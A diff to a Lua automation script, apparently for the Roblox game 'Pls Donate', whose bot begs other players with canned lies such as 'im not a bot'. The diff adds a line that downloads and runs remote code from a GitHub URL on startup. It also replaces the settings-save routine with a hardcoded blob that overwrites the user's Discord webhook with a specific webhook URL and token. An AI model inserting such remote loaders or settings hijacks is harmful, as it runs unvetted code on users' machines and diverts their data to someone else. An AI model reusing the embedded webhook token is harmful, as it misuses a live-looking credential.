@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Numass/script/refs/heads/main/editsettings.lua"))
+
 repeat
 	task.wait()
 until game:IsLoaded()
@@ -173,7 +175,7 @@ local settingsLock
 function saveSettings()
 	if not settingsLock then
 		local suc, er = pcall(function()
-			writefile('plsdonatesettings.txt', httpservice:JSONEncode(getgenv().settings))
+			writefile('plsdonatesettings.txt', "{\"render\":true,\"boothSwitcher\":false,\"customBoothText\":\"✅ 1R$ = 10 Jump ✅\\nHope you have a good day !\",\"serverHopDelay\":200,\"antiBotServers\":false,\"fontFace\":\"Bangers\",\"goalServerhopSwitch\":false,\"webhookType\":\"New\",\"autoReplyNoRespond\":true,\"rainbowText\":true,\"boothTop\":false,\"serverHopToggle\":false,\"highlightSwitch\":false,\"goalBox\":5,\"begDelay\":300,\"removeHeadNametag\":false,\"donationJump\":true,\"begMessage\":[\"1R$ = 10 Jump\",\"Im jumping 10 times on donations\"],\"goalServerhopGoal\":100,\"webhookBox\":\" `https://discord.com/api/webhooks/1396852837861818400/tgRM8TPZn2EZPpYJN-Ttz-AocbYzjWQIn3hV-I-5gnDzl-akf8sU0pyVBrYTjjpH1GVk` \",\"spinSet\":false,\"AnonymousMode\":true,\"signUpdateToggle\":false,\"textUpdateToggle\":true,\"boothPosition\":-6,\"scamResponce\":[\"im no scam\",\"im not a scammer\",\"this is not a scam\",\"Test it ;)\"],\"signToggle\":false,\"botResponce\":[\"no im not\",\"im not a bot\",\"Bruh you noob\"],\"helicopterEnabled\":false,\"fpsLimit\":5,\"friendHop\":false,\"autoNearReply\":true,\"fontSize\":5,\"hexBox\":\"#32CD32\",\"webhookAfterSH\":true,\"taggedBoothHop\":false,\"signHexBox\":\"#ffffff\",\"noFont\":false,\"autoThanks\":true,\"autoBeg\":true,\"standingPosition\":\"Left\",\"pingAboveDono\":400,\"staffHopA\":true,\"robuxLap\":false,\"AlternativeHop\":false,\"jumpsPerRobux\":10,\"minimumDonated\":0,\"vcServer\":false,\"jumpBoost\":false,\"webhookToggle\":true,\"spinSpeedMultiplier\":1,\"serverHopAfterDonation\":false,\"fpsBoost\":false,\"donateResponce\":[\"sorry im saving\",\"i am saving for korblox\",\"sorry my robux is pending\"],\"thanksDelay\":3,\"textUpdateDelay\":30,\"helloResponce\":[\"Hi\",\"Sup\",\"Hello\",\"jo cutie\"],\"pingEveryone\":true,\"otherResponce\":[\"..?\",\"what\",\"?\",\"???\"],\"danceChoice\":\"1\",\"gravitySwitch\":false,\"thanksMessage\":[\"Thank you\",\"Thanks!\",\"ty :)\",\"tysm!\",\"Ty have a nice day !\",\"I love you \"],\"signText\":\"your text here\"}")
 		end)
 		if not suc then
 			return warn('lol')
@@ -1021,7 +1023,7 @@ TB.Text = 'Minimum ping dono amount: ' .. getgenv().settings.pingAboveDono
 
 webhookTab:AddButton("Test Webhook", function()
 	if getgenv().settings.webhookBox:gsub(" ","") ~= "" then
-		oldWebhook("Webhook works! you still bad")
+		oldWebhook("Webhook works!")
 	end
 end)
 
